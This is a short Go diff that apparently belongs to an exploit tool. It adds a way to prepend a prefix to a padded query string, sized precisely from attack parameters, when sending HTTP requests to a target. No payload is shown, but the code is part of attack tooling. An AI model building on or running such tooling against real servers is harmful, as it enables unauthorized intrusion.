@@ -43,6 +43,10 @@ func NewRequester(resource, cookie string) (*Requester, error) {
 }
 
 func (r *Requester) Request(pathInfo string, params *AttackParams) (*http.Response, []byte, error) {
+	return r.RequestWithQueryStringPrefix(pathInfo, params, "")
+}
+
+func (r *Requester) RequestWithQueryStringPrefix(pathInfo string, params *AttackParams, prefix string) (*http.Response, []byte, error) {
 	if !strings.HasPrefix(pathInfo, "/") {
 		return nil, nil, fmt.Errorf("path doesn't start with slash: %#v", pathInfo)
 	}
@@ -52,11 +56,11 @@ func (r *Requester) Request(pathInfo string, params *AttackParams) (*http.Respon
 	if qslDelta%2 != 0 {
 		panic(fmt.Errorf("got odd qslDelta, that means the URL encoding gone wrong: pathInfo=%#v, qslDelta=%#v", qslDelta))
 	}
-	qslPrime := params.QueryStringLength - qslDelta/2
+	qslPrime := params.QueryStringLength - qslDelta/2 - len(prefix)
 	if qslPrime < 0 {
-		panic(fmt.Errorf("qsl value too small: qsl=%v, qslDelta=%v", params.QueryStringLength, qslDelta))
+		return nil, nil, fmt.Errorf("qsl value too small: qsl=%v, qslDelta=%v, prefix=%#v", params.QueryStringLength, qslDelta, prefix)
 	}
-	u.RawQuery = strings.Repeat("Q", qslPrime)
+	u.RawQuery = prefix + strings.Repeat("Q", qslPrime)
 	req, err := http.NewRequest("GET", u.String(), nil)
 	if err != nil {
 		return nil, nil, err
